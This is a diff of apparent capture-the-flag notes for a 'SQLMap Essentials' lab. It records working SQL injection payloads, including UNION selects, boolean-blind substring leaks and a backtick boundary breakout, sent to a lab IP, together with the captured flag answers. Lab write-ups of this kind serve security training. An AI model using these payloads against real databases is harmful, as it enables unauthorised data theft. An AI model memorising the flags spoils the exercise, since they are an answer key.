@@ -153,3 +153,21 @@ ANSWER flag3: HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}
 printf '{"id":"0 union select 1,2,3,4,5,(select content from flag4)"}' > /tmp/c4.json
 curl -X POST http://154.57.164.79:40261/case4.php -H 'Content-Type: application/json' --data-binary @/tmp/c4.json
 ANSWER flag4: HTB{j450n_v00rh335_53nd5_6r475}
+
+---
+# SQLMap Essentials - Attack Tuning Cases 5/6/7 (target 154.57.164.79:40261)
+
+## Case 5 (GET id, OR boolean/time-based blind)
+TRUE test: id=1 OR 1=1 -> 32 rows. Leak via boolean subquery:
+  id=1 OR (select substring(content,8,1) from flag5)=0x5f  -> 32 rows (true)
+ANSWER flag5: HTB{700_much_r15k_bu7_w0r7h_17}
+
+## Case 6 (GET col, non-standard boundaries = value wrapped in backticks: id = `$col`)
+Boolean leak:
+  col=id`=`id` AND 1=1 AND `id`=`id                -> 32 rows (true)
+  col=id`=`id` AND (select content from flag6)=0x<hex> AND `id`=`id -> 32 rows
+ANSWER flag6: HTB{v1nc3_mcm4h0n_15_4570n15h3d}
+
+## Case 7 (GET id, UNION, 5 columns)
+  id=0 union select 1,2,3,4,(select content from flag7)
+ANSWER flag7: HTB{un173_7h3_un173d}
